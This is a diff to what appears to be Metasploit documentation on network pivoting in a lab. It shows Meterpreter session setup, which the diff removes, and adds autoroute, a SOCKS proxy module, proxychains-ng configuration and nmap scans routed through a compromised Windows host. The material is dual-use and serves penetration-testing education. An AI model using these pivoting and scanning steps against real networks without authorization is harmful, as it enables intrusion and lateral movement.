@@ -1,3 +1,17 @@
+
+# Overview of Pivoting And Its Benefits
+Whilst in test environments one is often looking at flat networks that only have one subnet and one network environment, the reality is that when it comes to pentests that are attempting to compromise an entire company, you will often have to deal with multiple networks, often with switches or firewalls in-between that are intended to keep these networks separate from one another.
+
+In order for pivoting to work, you must have compromised a host that is connected to two or more networks. This usually means that the host has two or more network adapters, whether that be physical network adapters, virtual network adapters, or a combination of both.
+
+Once you have compromised a host that has multiple network adapters you can then use the session that you have obtained on that host to use that host as a pivot, and relay traffic through the compromised host to the target machine that you want to access. This allows you, as an attacker, to access machines on networks that you might not otherwise have access to, by utilizing the access to internal networks that the compromised machine has.
+
+Now that we understand some of the background, lets see this in action a bit more by setting up a sample environment and walking through some of Metasploit's pivoting features.
+
+# A Quick Note Before Continuing
+Pivoting functionality is provided by all Meterpreter and SSH sessions that occur over TCP channels. Whilst Meterpreter is mentioned below, keep in mind that this would also work with an SSH session as well. We have just resorted to using Meterpreter for this example for demonstration purposes.
+
+# Testing Pivoting
 ## Target Environment Setup
 - Kali Machine
 	- Internal: None
@@ -9,103 +23,9 @@
 	- Internal: 169.254.204.110
 	- External: None
 
-## Initial Session Setup
-Lets grab a session on the Windows 11 machine. We will assume we get a shell via some exploit or a backdoored file however to keep things simple here we will just go with some malicious EXE that the user clicks on:
+For the purpose of simplicity we will assume we have a session on the Windows 11 box, which we will use as a pivot to route our traffic through to the Windows Server 2019 box at 169.254.204.110.
 
-```
-msf6 payload(windows/x64/meterpreter/reverse_tcp) > use multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
-payload => windows/x64/meterpreter/bind_tcp
-msf6 exploit(multi/handler) > set RHOST 172.19.185.34
-RHOST => 172.19.185.34
-msf6 exploit(multi/handler) > exploit
-
-[*] Started bind TCP handler against 172.19.185.34:4444
-[*] Sending stage (200262 bytes) to 172.19.185.34
-[*] Meterpreter session 1 opened (172.19.182.171:40601 -> 172.19.185.34:4444 ) at 2022-04-07 14:29:04 -0500
-
-meterpreter > sysinfo
-Computer        : WIN11-TEST
-OS              : Windows 10 (10.0 Build 22000).
-Architecture    : x64
-System Language : en_US
-Domain          : TESTINGDOMAIN
-Logged On Users : 10
-Meterpreter     : x64/windows
-meterpreter > getuid
-Server username: WIN11-TEST\normal
-meterpreter > 
-```
-
-Now that we have the session we need to check how many interfaces it has. In the case of a dual-homed host, usually one interface is used for the internal network and the other for the external network. Multi-homed hosts might also be encountered in which case the host will have multiple network interfaces, each connecting to different networks, making it possible to use the compromised host to access multiple networks. We can check how many network interfaces are on a host using the `ifconfig` or `ipconfig` commands of Meterpreter:
-
-```
-meterpreter > ifconfig
-
-Interface  1
-============
-Name         : Software Loopback Interface 1
-Hardware MAC : 00:00:00:00:00:00
-MTU          : 4294967295
-IPv4 Address : 127.0.0.1
-IPv4 Netmask : 255.0.0.0
-IPv6 Address : ::1
-IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-
-
-Interface 13
-============
-Name         : Microsoft Hyper-V Network Adapter
-Hardware MAC : 00:15:5d:a6:01:6e
-MTU          : 1500
-IPv4 Address : 169.254.16.221
-IPv4 Netmask : 255.255.0.0
-IPv6 Address : fe80::50bc:6e8c:df16:10dd
-IPv6 Netmask : ffff:ffff:ffff:ffff::
-
-
-Interface 14
-============
-Name         : Microsoft Hyper-V Network Adapter #2
-Hardware MAC : 00:15:5d:a6:01:7c
-MTU          : 1500
-IPv4 Address : 172.19.185.34
-IPv4 Netmask : 255.255.240.0
-IPv6 Address : fe80::f9ca:9a25:df4c:3687
-IPv6 Netmask : ffff:ffff:ffff:ffff::
-
-meterpreter > 
-```
-We can ignore the loopback interface since that isn't of importance to us here (we don't want to communicate only with the host we have compromised after all), and instead we will focus on the other two interfaces. We can see that each of these belong to separate networks, specifically 169.254.0.0/16 and 172.16.0.0/20.
-
-We know that the 172.16.0.0/20 network is the external network since our attacker machine is on this network, and we want to reach the host 169.254.204.110 containing the Windows Server 2019 host on the internal network. We can also see that our compromised Windows 11 host has a second network adapter that belongs to the same network address range as Windows Server 2019. We can test this theory by trying to ping 169.254.204.110 from the compromised host. This assumes that 169.254.204.110 does not have a firewall in place that would otherwise drop or block these ping requests however, so its not the most reliable of tests, however as can be seen below we can confirm we are on the same network and are able to reach 169.254.204.110.
-
-```
-meterpreter > shell
-Process 8476 created.
-Channel 1 created.
-Microsoft Windows [Version 10.0.22000.593]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Users\normal\Desktop>ping 169.254.204.110
-ping 169.254.204.110
-
-Pinging 169.254.204.110 with 32 bytes of data:
-Reply from 169.254.204.110: bytes=32 time<1ms TTL=128
-Reply from 169.254.204.110: bytes=32 time<1ms TTL=128
-Reply from 169.254.204.110: bytes=32 time<1ms TTL=128
-Reply from 169.254.204.110: bytes=32 time<1ms TTL=128
-
-Ping statistics for 169.254.204.110:
-    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
-Approximate round trip times in milli-seconds:
-    Minimum = 0ms, Maximum = 0ms, Average = 0ms
-
-C:\Users\normal\Desktop>
-```
-
-Now we need to add our route to the target in such a way that Metasploit knows to use the session we have obtained on the Windows 11 machine as a pivot to route our traffic through to the Windows Server 2019 box at 169.254.204.110. Lets look at a couple of methods to do this.
+There a few ways to register this route in Metasploit so that it knows how to redirect traffic appropriately. Lets take a look at these methods.
 
 ## AutoRoute
 One of the easiest ways to do this is to use the `post/multi/manage/autoroute` module which will help us automatically add in routes for the target to Metasploit's routing table so that Metasploit knows how to route traffic through the session that we have on the Windows 11 box and to the target Windows Server 2019 box. Lets look at a sample run of this command:
@@ -291,5 +211,246 @@ msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce)
 [*] 169.254.204.110:443 - The target is not exploitable. Exchange Server 15.2.986.14 does not appear to be a vulnerable version!
 msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce) > 
 ```
+
 # Pivoting External Tools
 ## Portfwd
+To come, awaiting some more testing hold on :)
+
+## Socks Module
+Once routes are established, Metasploit modules can access the IP range specified in the routes. For other applications to access the routes, a little bit more setup is necessary. One way to solve this involves using the `auxiliary/server/socks_proxy` Metasploit module to set up a socks4a proxy, and then using `proxychains-ng` to direct external applications towards the established socks4a proxy server that Metasploit has set up so that external applications can use Metasploit's internal routing table.
+### Socks Server Module Setup
+Metasploit can launch a SOCKS proxy server using the module: `auxiliary/server/socks_proxy`. When set up to bind to a local loopback adapter, applications can be directed to use the proxy to route TCP/IP traffic through Metasploit's routing tables. Here is an example of how this module might be used:
+
+```
+msf6 > use auxiliary/server/socks_proxy 
+msf6 auxiliary(server/socks_proxy) > show options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        Proxy password for SOCKS5 listener
+   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on.
+                                         This must be an address on the local machine or
+                                        0.0.0.0 to listen on all addresses.
+   SRVPORT   1080             yes       The port to listen on
+   USERNAME                   no        Proxy username for SOCKS5 listener
+   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+
+
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+SRVHOST => 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
+SRVPORT => 1080
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 0.
+msf6 auxiliary(server/socks_proxy) > 
+[*] Starting the SOCKS proxy server
+
+msf6 auxiliary(server/socks_proxy) > jobs
+
+Jobs
+====
+
+  Id  Name                           Payload  Payload opts
+  --  ----                           -------  ------------
+  0   Auxiliary: server/socks_proxy
+
+msf6 auxiliary(server/socks_proxy) > 
+```
+
+### proxychains-ng Setup
+First, make sure that you have installed `proxychains-ng`. You can also use `proxychains` however most repositories such as Ubuntu will have an outdated version of it and it has crashed before in my tests, so it is highly recommended to use `proxychains-ng` instead which is actively maintained. You can install it with the following commands:
+
+```
+git clone https://github.com/rofl0r/proxychains-ng 
+cd proxychains-ng
+make
+sudo make install
+```
+
+Now edit the `proxychains` configuration file located at `/etc/proxychains.conf`. Add the below line to the end of the file to set `proxychains-ng` to use the SOCKS 5 server that you just set up. Note that you may need to use `sudo` to edit this file due to the default permissions on this file preventing anyone but `root` from writing to it.
+
+```
+socks5 127.0.0.1 1080
+```
+
+The final final should look something like this:
+
+```
+# proxychains.conf  VER 3.1
+#
+#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
+#	
+
+# The option below identifies how the ProxyList is treated.
+# only one option should be uncommented at time,
+# otherwise the last appearing option will be accepted
+#
+#dynamic_chain
+#
+# Dynamic - Each connection will be done via chained proxies
+# all proxies chained in the order as they appear in the list
+# at least one proxy must be online to play in chain
+# (dead proxies are skipped)
+# otherwise EINTR is returned to the app
+#
+strict_chain
+#
+# Strict - Each connection will be done via chained proxies
+# all proxies chained in the order as they appear in the list
+# all proxies must be online to play in chain
+# otherwise EINTR is returned to the app
+#
+#random_chain
+#
+# Random - Each connection will be done via random proxy
+# (or proxy chain, see  chain_len) from the list.
+# this option is good to test your IDS :)
+
+# Make sense only if random_chain
+#chain_len = 2
+
+# Quiet mode (no output from library)
+#quiet_mode
+
+# Proxy DNS requests - no leak for DNS data
+proxy_dns 
+
+# Some timeouts in milliseconds
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+# ProxyList format
+#       type  host  port [user pass]
+#       (values separated by 'tab' or 'blank')
+#
+#
+#        Examples:
+#
+#            	socks5	192.168.67.78	1080	lamer	secret
+#		http	192.168.89.3	8080	justu	hidden
+#	 	socks4	192.168.1.49	1080
+#	        http	192.168.39.93	8080	
+#		
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 1080
+```
+
+Note: If there are other proxy entries in the configuration file, you may need to comment them out as they may interfere with proper routing.
+
+### Using Proxychains-NG
+Now you can combine proxychains-ng with other application like Nmap, Nessus, Firefox and more to scan or access machines and resources through the Metasploit routes. All you need to do is call proxychains-ng before the needed application. No need to change the proxy settings in the respective application.
+
+Note that for the purpose of this test, the Windows Server 2019 server is now at 169.254.37.128.
+
+```
+ ~/git/metasploit-framework │ master ?21  wget https://169.254.37.128            
+--2022-04-08 13:52:23--  https://169.254.37.128/
+Connecting to 169.254.37.128:443... failed: No route to host.
+~/git/proxychains-ng │ master ?1  proxychains4 wget https://169.254.37.128
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/local/lib/libproxychains4.so
+[proxychains] DLL init: proxychains-ng 4.16-git-1-g07c15a0
+--2022-04-08 14:06:52--  https://169.254.37.128/
+Connecting to 169.254.37.128:443... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:443  ...  OK
+connected.
+ERROR: cannot verify 169.254.37.128's certificate, issued by ‘CN=DC1’:
+  Self-signed certificate encountered.
+    ERROR: certificate common name ‘DC1’ doesn't match requested host name ‘169.254.37.128’.
+To connect to 169.254.37.128 insecurely, use `--no-check-certificate'.
+ ~/git/proxychains-ng │ master ?1                  
+```
+
+### Scanning
+For scanning with Nmap, Zenmap, Nessus and others, keep in mind that ICMP and UPD traffic cannot tunnel through the proxy. So you cannot perform ping or UDP scans.
+
+For Nmap and Zenmap, the below example shows the commands can be used. It is best to be selective on ports to scan since scanning through the proxy tunnel can be slow.
+
+```
+$ sudo proxychains4 nmap -n -sT -sV -PN -p 445 10.10.125.0/24
+```
+
+Here is an example of how this might look when scanning a single host for port 445 over `proxychains-ng`:
+
+```
+ ~/git/proxychains-ng │ master ?1  proxychains4 nmap -n -sT -A -PN -p 445 169.254.37.128
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/local/lib/libproxychains4.so
+[proxychains] DLL init: proxychains-ng 4.16-git-1-g07c15a0
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-08 14:08 CDT
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:7458 <--socket error or timeout!
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:42597 <--socket error or timeout!
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:1433 <--socket error or timeout!
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
+Nmap scan report for 169.254.37.128
+Host is up (0.14s latency).
+
+PORT    STATE SERVICE       VERSION
+445/tcp open  microsoft-ds?
+
+Host script results:
+|_clock-skew: -1s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-04-08T19:09:38
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 83.03 seconds
+```
